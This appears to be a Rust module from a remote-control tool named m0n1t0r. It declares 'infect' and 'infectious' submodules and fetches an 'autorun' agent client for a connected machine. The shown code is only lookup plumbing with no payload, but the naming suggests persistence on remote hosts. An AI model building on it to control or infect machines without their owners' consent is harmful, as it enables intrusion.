pub mod infect;
pub mod infectious;

use crate::{
    ServerMap,
    web::{Error, Result as WebResult},
};
use actix_web::web::Data;
use m0n1t0r_common::{autorun::AgentClient, client::Client as _};
use std::{net::SocketAddr, sync::Arc};
use tokio::sync::RwLock;
use tokio_util::sync::CancellationToken;

pub async fn agent(
    data: Data<Arc<RwLock<ServerMap>>>,
    addr: &SocketAddr,
) -> WebResult<(AgentClient, CancellationToken)> {
    let lock_map = &data.read().await.map;
    let server = lock_map.get(&addr).ok_or(Error::NotFound)?;

    let lock_obj = server.read().await;
    let client = lock_obj.client()?;
    let canceller = lock_obj.canceller();
    let agent = client.autorun_agent().await?;
    drop(lock_obj);

    Ok((agent, canceller))
}
